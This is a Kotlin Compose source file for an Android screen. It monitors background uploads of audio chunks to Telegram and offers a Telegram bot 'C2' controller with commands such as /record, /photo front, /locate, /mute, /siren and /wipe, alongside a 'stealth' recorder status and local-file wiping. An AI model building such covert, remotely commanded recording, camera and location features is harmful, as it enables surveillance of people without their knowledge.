package com.example.ui.screens.recorder

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Assessment
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.Cancel
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.CleaningServices
import androidx.compose.material.icons.filled.CloudDone
import androidx.compose.material.icons.filled.CloudOff
import androidx.compose.material.icons.filled.CloudQueue
import androidx.compose.material.icons.filled.CloudUpload
import androidx.compose.material.icons.filled.DeleteSweep
import androidx.compose.material.icons.filled.ErrorOutline
import androidx.compose.material.icons.filled.HourglassTop
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Schedule
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Send
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material.icons.filled.VolumeMute
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilterChip
import androidx.compose.material3.FilterChipDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.work.WorkInfo
import androidx.work.WorkManager
import com.example.core.recorder.AudioChunkRecorder
import com.example.core.recorder.TelegramUploadWorker
import com.example.ui.EnforcerViewModel
import com.example.ui.theme.CyberAmber
import com.example.ui.theme.CyberBg
import com.example.ui.theme.CyberBorder
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberCyanMuted
import com.example.ui.theme.CyberGreen
import com.example.ui.theme.CyberRed
import com.example.ui.theme.CyberSurface
import com.example.ui.theme.CyberSurfaceVariant
import com.example.ui.theme.CyberTextMuted
import com.example.ui.theme.CyberTextPrimary
import com.example.ui.theme.CyberTextSecondary
import java.util.UUID

enum class UploadFilter(val label: String) {
    ALL("All"),
    ACTIVE("Active / Running"),
    ENQUEUED("Queued"),
    COMPLETED("Completed"),
    FAILED("Failed / Retrying")
}

/**
 * Jetpack Compose screen that directly observes WorkManager's work info for
 * TelegramUploadWorker background tasks and displays live upload statuses
 * using an ergonomic Row-based UI layout.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun TelegramUploadsScreen(
    viewModel: EnforcerViewModel,
    hasCameraPermission: Boolean = true,
    onRequestCameraPermission: () -> Unit = {},
    onNavigateBack: (() -> Unit)? = null,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val workManager = remember { WorkManager.getInstance(context) }

    // Direct observation of WorkManager Flow for TelegramUploadWorker tasks
    val workInfos by workManager
        .getWorkInfosByTagFlow(TelegramUploadWorker.TAG_TELEGRAM_UPLOAD)
        .collectAsStateWithLifecycle(initialValue = emptyList())

    val telegramWipedFilesCount by viewModel.telegramWipedFilesCount.collectAsStateWithLifecycle()
    val telegramTotalBytesWiped by viewModel.telegramTotalBytesWiped.collectAsStateWithLifecycle()
    val isStealthActive by viewModel.isStealthServiceRunning.collectAsStateWithLifecycle()

    val isTelegramPollingActive by viewModel.isTelegramPollingActive.collectAsStateWithLifecycle()
    val telegramLatestCommand by viewModel.telegramLatestCommand.collectAsStateWithLifecycle()
    val telegramCommandLogs by viewModel.telegramCommandLogs.collectAsStateWithLifecycle()

    var selectedFilter by remember { mutableStateOf(UploadFilter.ALL) }

    // Categorized lists
    val activeTasks = remember(workInfos) {
        workInfos.filter { it.state == WorkInfo.State.RUNNING }
    }
    val enqueuedTasks = remember(workInfos) {
        workInfos.filter { it.state == WorkInfo.State.ENQUEUED || it.state == WorkInfo.State.BLOCKED }
    }
    val completedTasks = remember(workInfos) {
        workInfos.filter { it.state == WorkInfo.State.SUCCEEDED }
    }
    val failedTasks = remember(workInfos) {
        workInfos.filter { it.state == WorkInfo.State.FAILED || it.state == WorkInfo.State.CANCELLED }
    }

    val filteredList = remember(workInfos, selectedFilter) {
        when (selectedFilter) {
            UploadFilter.ALL -> workInfos
            UploadFilter.ACTIVE -> activeTasks
            UploadFilter.ENQUEUED -> enqueuedTasks
            UploadFilter.COMPLETED -> completedTasks
            UploadFilter.FAILED -> failedTasks
        }
    }

    Scaffold(
        modifier = modifier
            .fillMaxSize()
            .testTag("telegram_uploads_screen"),
        containerColor = CyberBg,
        topBar = {
            TopAppBar(
                title = {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(10.dp)
                                .clip(CircleShape)
                                .background(if (activeTasks.isNotEmpty()) CyberCyan else CyberGreen)
                        )
                        Column {
                            Text(
                                text = "TELEGRAM CLOUD WORKERS",
                                fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold,
                                fontSize = 14.sp,
                                color = CyberCyan
                            )
                            Text(
                                text = "WorkManager Background Pipe • 0 MB Local Storage",
                                fontFamily = FontFamily.Monospace,
                                fontSize = 9.sp,
                                color = CyberTextMuted
                            )
                        }
                    }
                },
                navigationIcon = {
                    if (onNavigateBack != null) {
                        IconButton(
                            onClick = onNavigateBack,
                            modifier = Modifier.testTag("btn_uploads_back")
                        ) {
                            Icon(
                                imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                                contentDescription = "Back",
                                tint = CyberCyan
                            )
                        }
                    }
                },
                actions = {
                    IconButton(
                        onClick = { viewModel.pruneCompletedWork() },
                        modifier = Modifier.testTag("btn_prune_completed_top")
                    ) {
                        Icon(
                            imageVector = Icons.Default.CleaningServices,
                            contentDescription = "Prune completed tasks",
                            tint = CyberTextMuted
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = CyberSurface
                )
            )
        }
    ) { innerPadding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp),
            contentPadding = PaddingValues(top = 12.dp, bottom = 32.dp)
        ) {
            // ==========================================
            // ROW-BASED SUMMARY METRICS STRIP
            // ==========================================
            item {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("upload_metrics_summary_row"),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    MetricCard(
                        modifier = Modifier.weight(1f),
                        label = "RUNNING",
                        value = "${activeTasks.size}",
                        accentColor = CyberCyan,
                        icon = Icons.Default.CloudUpload
                    )
                    MetricCard(
                        modifier = Modifier.weight(1f),
                        label = "ENQUEUED",
                        value = "${enqueuedTasks.size}",
                        accentColor = CyberAmber,
                        icon = Icons.Default.CloudQueue
                    )
                    MetricCard(
                        modifier = Modifier.weight(1f),
                        label = "WIPED (0MB)",
                        value = "$telegramWipedFilesCount",
                        accentColor = CyberGreen,
                        icon = Icons.Default.CloudDone
                    )
                    MetricCard(
                        modifier = Modifier.weight(1f),
                        label = "TOTAL WIPED",
                        value = AudioChunkRecorder.formatBytes(telegramTotalBytesWiped),
                        accentColor = CyberGreen,
                        icon = Icons.Default.CheckCircle
                    )
                }
            }

            // ==========================================
            // ACTION CONTROLS ROW
            // ==========================================
            item {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("upload_action_controls_row"),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Button(
                        onClick = { viewModel.enqueueTestUploadTask() },
                        modifier = Modifier
                            .weight(1f)
                            .height(40.dp)
                            .testTag("btn_enqueue_test_upload"),
                        colors = ButtonDefaults.buttonColors(containerColor = CyberCyan),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 8.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.Add,
                            contentDescription = null,
                            tint = CyberBg,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = "Enqueue Test Task",
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 11.sp,
                            color = CyberBg
                        )
                    }

                    if (activeTasks.isNotEmpty() || enqueuedTasks.isNotEmpty()) {
                        OutlinedButton(
                            onClick = { viewModel.cancelAllUploadWork() },
                            modifier = Modifier
                                .weight(1f)
                                .height(40.dp)
                                .testTag("btn_cancel_all_uploads"),
                            colors = ButtonDefaults.outlinedButtonColors(
                                contentColor = CyberRed
                            ),
                            border = BorderStroke(1.dp, CyberRed.copy(alpha = 0.6f)),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 8.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Default.Cancel,
                                contentDescription = null,
                                tint = CyberRed,
                                modifier = Modifier.size(16.dp)
                            )
                            Spacer(modifier = Modifier.width(4.dp))
                            Text(
                                text = "Cancel All",
                                fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold,
                                fontSize = 11.sp,
                                color = CyberRed
                            )
                        }
                    }

                    OutlinedButton(
                        onClick = { viewModel.pruneCompletedWork() },
                        modifier = Modifier
                            .height(40.dp)
                            .testTag("btn_prune_tasks"),
                        colors = ButtonDefaults.outlinedButtonColors(
                            contentColor = CyberTextSecondary
                        ),
                        border = BorderStroke(1.dp, CyberBorder),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 10.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.CleaningServices,
                            contentDescription = null,
                            tint = CyberTextSecondary,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = "Prune",
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp,
                            color = CyberTextSecondary
                        )
                    }
                }
            }

            // ==========================================
            // TWO-WAY TELEGRAM BOT CONTROLLER (C2) CARD
            // ==========================================
            item {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("telegram_c2_controller_card"),
                    colors = CardDefaults.cardColors(containerColor = CyberSurface),
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, if (isTelegramPollingActive) CyberGreen else CyberBorder)
                ) {
                    Column(
                        modifier = Modifier.padding(14.dp),
                        verticalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        // Title & Listener Toggle Row
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                Box(
                                    modifier = Modifier
                                        .size(10.dp)
                                        .clip(CircleShape)
                                        .background(if (isTelegramPollingActive) CyberGreen else CyberTextMuted)
                                )
                                Column {
                                    Text(
                                        text = "TWO-WAY TELEGRAM COMMAND CONTROLLER",
                                        fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold,
                                        fontSize = 12.sp,
                                        color = CyberGreen
                                    )
                                    Text(
                                        text = if (isTelegramPollingActive) "Listener Active • Polling authorized chat" else "Listener Standby • Offline",
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.sp,
                                        color = CyberTextMuted
                                    )
                                }
                            }

                            Button(
                                onClick = { viewModel.toggleTelegramPolling() },
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (isTelegramPollingActive) CyberRed.copy(alpha = 0.8f) else CyberGreen
                                ),
                                shape = RoundedCornerShape(8.dp),
                                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                modifier = Modifier
                                    .height(32.dp)
                                    .testTag("btn_toggle_telegram_c2")
                            ) {
                                Text(
                                    text = if (isTelegramPollingActive) "STOP LISTENER" else "START LISTENER",
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 10.sp,
                                    color = CyberBg
                                )
                            }
                        }

                        // Last Executed Command
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(6.dp))
                                .background(CyberBg)
                                .border(1.dp, CyberBorder, RoundedCornerShape(6.dp))
                                .padding(horizontal = 10.dp, vertical = 6.dp)
                        ) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(
                                        imageVector = Icons.Default.Terminal,
                                        contentDescription = null,
                                        tint = CyberCyan,
                                        modifier = Modifier.size(14.dp)
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Text(
                                        text = "LAST CMD: ",
                                        fontFamily = FontFamily.Monospace,
                                        fontWeight = FontWeight.Bold,
                                        fontSize = 10.sp,
                                        color = CyberCyan
                                    )
                                    Text(
                                        text = telegramLatestCommand,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.sp,
                                        color = CyberTextPrimary
                                    )
                                }
                            }
                        }

                        // Quick Test Action Chips
                        Text(
                            text = "QUICK TEST DISPATCHER / BOT COMMANDS:",
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 10.sp,
                            color = CyberTextSecondary
                        )

                        LazyRow(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/list") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.Terminal, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/list", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberCyan)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/status") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.Info, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/status", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberCyan)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/locate") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.LocationOn, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/locate (GPS)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberCyan)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/record 15") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.Mic, contentDescription = null, tint = CyberCyan, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/record 15s", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberCyan)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = {
                                        if (!hasCameraPermission) {
                                            onRequestCameraPermission()
                                        }
                                        viewModel.executeTelegramCommandDirect("/photo")
                                    },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, if (hasCameraPermission) CyberCyan.copy(alpha = 0.7f) else CyberAmber.copy(alpha = 0.9f))
                                ) {
                                    Icon(
                                        Icons.Default.CameraAlt,
                                        contentDescription = "Capture rear photo",
                                        tint = if (hasCameraPermission) CyberCyan else CyberAmber,
                                        modifier = Modifier.size(12.dp)
                                    )
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/photo (Rear)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (hasCameraPermission) CyberCyan else CyberAmber)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = {
                                        if (!hasCameraPermission) {
                                            onRequestCameraPermission()
                                        }
                                        viewModel.executeTelegramCommandDirect("/photo front")
                                    },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, if (hasCameraPermission) CyberCyan.copy(alpha = 0.7f) else CyberAmber.copy(alpha = 0.9f))
                                ) {
                                    Icon(
                                        Icons.Default.CameraAlt,
                                        contentDescription = "Capture front photo",
                                        tint = if (hasCameraPermission) CyberCyan else CyberAmber,
                                        modifier = Modifier.size(12.dp)
                                    )
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/photo front", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (hasCameraPermission) CyberCyan else CyberAmber)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/mute") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberAmber.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.VolumeMute, contentDescription = null, tint = CyberAmber, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/mute", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberAmber)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/siren 10") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberRed.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.NotificationsActive, contentDescription = null, tint = CyberRed, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/siren 10s", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberRed)
                                }
                            }
                            item {
                                OutlinedButton(
                                    onClick = { viewModel.executeTelegramCommandDirect("/wipe") },
                                    modifier = Modifier.height(30.dp),
                                    contentPadding = PaddingValues(horizontal = 8.dp),
                                    border = BorderStroke(1.dp, CyberGreen.copy(alpha = 0.7f))
                                ) {
                                    Icon(Icons.Default.DeleteSweep, contentDescription = null, tint = CyberGreen, modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("/wipe", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = CyberGreen)
                                }
                            }
                        }

                        // Recent Log View
                        if (telegramCommandLogs.isNotEmpty()) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(CyberBg)
                                    .padding(8.dp),
                                verticalArrangement = Arrangement.spacedBy(4.dp)
                            ) {
                                Text(
                                    text = "LIVE AUDIT FEED (C2):",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 9.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = CyberTextMuted
                                )
                                telegramCommandLogs.take(4).forEach { logLine ->
                                    Text(
                                        text = logLine,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.sp,
                                        color = if (logLine.contains("Received")) CyberGreen else CyberTextSecondary
                                    )
                                }
                            }
                        }
                    }
                }
            }

            // ==========================================
            // SCHEDULED 10:00 PM DAILY AUDIT SUMMARY CARD
            // ==========================================
            item {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("daily_10pm_audit_card"),
                    colors = CardDefaults.cardColors(containerColor = CyberSurface),
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, CyberAmber.copy(alpha = 0.6f))
                ) {
                    Column(
                        modifier = Modifier.padding(14.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Default.Assessment,
                                contentDescription = null,
                                tint = CyberAmber,
                                modifier = Modifier.size(18.dp)
                            )
                            Column {
                                Text(
                                    text = "SCHEDULED 10:00 PM DAILY SUMMARY",
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 12.sp,
                                    color = CyberAmber
                                )
                                Text(
                                    text = "WorkManager Nightly Cron • Tallies lectures, chunks, battery & storage",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 9.sp,
                                    color = CyberTextMuted
                                )
                            }
                        }

                        Text(
                            text = "Every night at 10:00 PM, a background task compiles your day's recorded lecture hours, uploaded audio chunks, battery level, and cache health into an end-of-day Markdown summary card posted directly to Telegram.",
                            fontSize = 11.sp,
                            color = CyberTextSecondary
                        )

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = { viewModel.scheduleDaily10PmAudit() },
                                colors = ButtonDefaults.buttonColors(containerColor = CyberAmber),
                                shape = RoundedCornerShape(8.dp),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(36.dp)
                                    .testTag("btn_arm_daily_10pm_audit")
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Schedule,
                                    contentDescription = null,
                                    tint = CyberBg,
                                    modifier = Modifier.size(14.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "ARM 10 PM CRON",
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 11.sp,
                                    color = CyberBg
                                )
                            }

                            OutlinedButton(
                                onClick = { viewModel.triggerDailyAuditNow() },
                                colors = ButtonDefaults.outlinedButtonColors(contentColor = CyberAmber),
                                border = BorderStroke(1.dp, CyberAmber.copy(alpha = 0.6f)),
                                shape = RoundedCornerShape(8.dp),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(36.dp)
                                    .testTag("btn_test_daily_audit_now")
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Send,
                                    contentDescription = null,
                                    tint = CyberAmber,
                                    modifier = Modifier.size(14.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "TEST NOW",
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 11.sp
                                )
                            }
                        }
                    }
                }
            }
            item {
                LazyRow(
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("upload_filter_chips_row"),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    items(UploadFilter.entries) { filter ->
                        val count = when (filter) {
                            UploadFilter.ALL -> workInfos.size
                            UploadFilter.ACTIVE -> activeTasks.size
                            UploadFilter.ENQUEUED -> enqueuedTasks.size
                            UploadFilter.COMPLETED -> completedTasks.size
                            UploadFilter.FAILED -> failedTasks.size
                        }
                        val isSelected = selectedFilter == filter

                        FilterChip(
                            selected = isSelected,
                            onClick = { selectedFilter = filter },
                            label = {
                                Text(
                                    text = "${filter.label} ($count)",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 11.sp
                                )
                            },
                            colors = FilterChipDefaults.filterChipColors(
                                selectedContainerColor = CyberCyan,
                                selectedLabelColor = CyberBg,
                                containerColor = CyberSurface,
                                labelColor = CyberTextSecondary
                            ),
                            border = BorderStroke(
                                1.dp,
                                if (isSelected) CyberCyan else CyberBorder
                            ),
                            modifier = Modifier.testTag("filter_chip_${filter.name.lowercase()}")
                        )
                    }
                }
            }

            // ==========================================
            // WORKMANAGER PIPELINE INFO ROW BANNER
            // ==========================================
            item {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(CyberSurface)
                        .border(1.dp, CyberBorder, RoundedCornerShape(8.dp))
                        .padding(horizontal = 12.dp, vertical = 8.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.HourglassTop,
                            contentDescription = null,
                            tint = CyberCyan,
                            modifier = Modifier.size(16.dp)
                        )
                        Text(
                            text = "WorkManager Tag: ${TelegramUploadWorker.TAG_TELEGRAM_UPLOAD}",
                            fontFamily = FontFamily.Monospace,
                            fontSize = 10.sp,
                            color = CyberTextSecondary
                        )
                    }
                    Text(
                        text = if (isStealthActive) "RECORDER ACTIVE" else "IDLE",
                        fontFamily = FontFamily.Monospace,
                        fontSize = 9.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (isStealthActive) CyberGreen else CyberTextMuted
                    )
                }
            }

            // ==========================================
            // EMPTY STATE OR WORK INFO TASK ROWS
            // ==========================================
            if (filteredList.isEmpty()) {
                item {
                    UploadEmptyState(
                        filter = selectedFilter,
                        onEnqueueTest = { viewModel.enqueueTestUploadTask() }
                    )
                }
            } else {
                items(
                    items = filteredList,
                    key = { it.id.toString() }
                ) { workInfo ->
                    UploadTaskRow(
                        workInfo = workInfo,
                        onCancel = { viewModel.cancelUploadWork(workInfo.id) },
                        onRetry = {
                            viewModel.cancelUploadWork(workInfo.id)
                            viewModel.enqueueTestUploadTask()
                        }
                    )
                }
            }
        }
    }
}

/**
 * High-polish Row-based UI layout for an individual WorkManager upload task.
 */
@Composable
fun UploadTaskRow(
    workInfo: WorkInfo,
    onCancel: () -> Unit,
    onRetry: () -> Unit,
    modifier: Modifier = Modifier
) {
    val progress = workInfo.progress
    val output = workInfo.outputData

    val chunkTitle = progress.getString(TelegramUploadWorker.KEY_LECTURE_TITLE)
        ?: output.getString(TelegramUploadWorker.KEY_LECTURE_TITLE)
        ?: run {
            val chunkTag = workInfo.tags.firstOrNull { it.startsWith("chunk_") }
            if (chunkTag != null) "Lecture Chunk (${chunkTag.replace('_', ' ')})" else "Telegram Audio Chunk"
        }

    val chunkIndex = progress.getInt(TelegramUploadWorker.KEY_CHUNK_INDEX, 0).takeIf { it > 0 }
        ?: output.getInt(TelegramUploadWorker.KEY_CHUNK_INDEX, 0)

    val progressPercent = when (workInfo.state) {
        WorkInfo.State.SUCCEEDED -> 100
        WorkInfo.State.ENQUEUED -> 0
        WorkInfo.State.RUNNING -> progress.getInt(TelegramUploadWorker.KEY_PROGRESS_PERCENT, 45)
        WorkInfo.State.FAILED -> 0
        WorkInfo.State.CANCELLED -> 0
        WorkInfo.State.BLOCKED -> 0
    }

    val bytesSent = progress.getLong(TelegramUploadWorker.KEY_PROGRESS_BYTES_SENT, 0L)
    val totalBytes = progress.getLong(TelegramUploadWorker.KEY_PROGRESS_TOTAL_BYTES, 0L)

    val statusMessage = progress.getString(TelegramUploadWorker.KEY_PROGRESS_STATUS_MSG)
        ?: output.getString(TelegramUploadWorker.KEY_PROGRESS_STATUS_MSG)
        ?: when (workInfo.state) {
            WorkInfo.State.ENQUEUED -> "Enqueued in WorkManager (Waiting for Wi-Fi/Cellular)"
            WorkInfo.State.RUNNING -> "Streaming encrypted chunks to Telegram..."
            WorkInfo.State.SUCCEEDED -> "Uploaded & disk wiped (0 MB local footprint)"
            WorkInfo.State.FAILED -> "Upload failed (Will retry with exponential backoff)"
